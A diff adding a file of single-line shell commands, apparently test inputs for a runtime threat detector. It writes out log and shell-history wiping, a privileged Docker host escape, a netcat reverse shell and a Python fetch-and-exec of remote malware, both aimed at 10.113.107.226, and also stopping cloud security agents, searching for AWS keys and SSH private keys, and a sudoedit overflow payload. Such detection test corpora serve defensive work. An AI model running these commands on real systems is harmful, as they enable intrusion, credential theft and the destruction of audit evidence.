@@ -1,0 +1,25 @@
+rm /var/log/syslog; rm /var/log/messages; rm /var/log/auth.log; rm /var/log/secure; rm /var/log/boot.log; rm /var/log/maillog; rm /var/log/mail.log; rm /var/log/kern.log; rm /var/log/dmesg; rm /var/log/faillog; rm /var/log/cron; rm /var/log/daemon.log; rm /var/log/btmp; rm /var/log/mysqld.log; rm /var/log/mysql.log; rm /var/log/xferlog
+docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{'Image':'alpine','Cmd':['sh','-c','echo Hello from Alpine'],'AttachStdout':true,'AttachStderr':true}" http://localhost/containers/create?name=alpine-from-api
+unshare -UrmC bash; mount -t cgroup -o memory cgroup /mnt
+cat /.bash_history; rm /.zsh_history
+modprobe msr allow_writes=on
+curl -x socks4://proxy.example.com http://www.example.com/
+kubectl create serviceaccount my-serviceaccount
+nc -e /bin/bash 10.113.107.226 4444
+pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
+mount -o remount,hidepid=2 /proc
+python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://10.113.107.226:8000/malware.py").read())'
+crontab -e
+service aliyun.service stop; service apparmor stop; service bcm-agent stop; service aegis stop
+ln /etc/passwd /tmp/passwdlink; ln -s /etc/passwd /tmp/passwdsymlink
+debugfs
+crictl -r unix:///custom/containerd/containerd.sock images
+insmod lime.ko "path=/mnt/memdump.lime format=raw"
+grep aws_access_key_id ~/.aws/credentials; fgrep secretaccesskey somefile.txt; grep hello file.txt; grep aws_secret_access_key config.txt; find / -name .aws/credentials; mlocate .aws/credentials; locate secrets.txt
+printenv
+cp /bin/bash pkexec; ./pkexec
+find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -name id_rsa; grep "BEGIN RSA PRIVATE KEY" ~/.ssh/id_rsa; find /home -name id_ed25519; egrep "BEGIN OPENSSH PRIVATE KEY" ~/.ssh/id_ed25519; fgrep "BEGIN PRIVATE KEY" ~/.ssh/id_ecdsa
+sudo -u test sudoedit -s \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\
+steghide embed -cf -ef secret.txt test.jpg
